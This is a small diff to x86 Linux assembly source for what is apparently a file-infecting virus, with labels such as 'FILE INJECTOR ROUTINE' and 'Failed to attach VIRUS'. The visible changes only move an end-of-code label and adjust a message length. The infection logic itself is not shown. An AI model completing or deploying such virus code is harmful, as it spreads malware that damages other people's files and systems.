@@ -53,6 +53,7 @@ infection:
     ret
 
 inf_msg: db "Hello, Infected File", 10
+code_end:
 
 ; ==============================================================================
 ; FILE INJECTOR ROUTINE
@@ -90,12 +91,11 @@ infector:
     mov     eax, 4
     mov     ebx, 1
     mov     ecx, error_message
-    mov     edx, 23
+    mov     edx, 24
     int     0x80
 
     mov     eax, 1
     mov     ebx, 0x55
     int     0x80
 
-error_message: db "Failed to attach VIRUS", 10
-code_end:
+error_message: db " Failed to attach VIRUS", 10
